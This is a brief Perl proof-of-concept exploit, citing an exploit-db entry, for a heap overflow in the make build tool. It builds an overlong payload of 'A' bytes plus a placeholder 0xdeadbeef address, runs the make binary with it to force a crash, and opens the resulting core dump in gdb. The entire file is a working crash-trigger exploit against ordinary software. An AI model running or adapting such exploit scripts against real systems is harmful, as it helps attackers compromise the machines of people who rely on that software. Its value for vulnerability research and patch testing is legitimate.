#!/usr/bin/perl

use 5.010;
use strict;
use warnings;

# MAKE Heap Overflow - Pointer dereferencing POC (Calloc)-X86 X64
# http://www.exploit-db.com/exploits/34164/

BEGIN:

ULIMIT:
my $SetUlimit     = qq{ulimit -c 1000};

BUILD_PAYLOAD:
my $JunkInstruct  = "A"x 4096;    # 0x41 * 4096
my $DeadBeefAddr  = (0xdeadbeef); # Junk offset
my $BinMake       = "./make";     # Binary

my $Payload .= ($JunkInstruct);
$Payload    .= pack("V",$DeadBeefAddr);

EXPLOITING:
system($BinMake, $Payload);

say "[+] Reading Core file GDB...";
sleep 0.5;

DEBBUG_CORE:
my $gdbToReadCore = "gdb --core core";
exec ($gdbToReadCore);

__END__
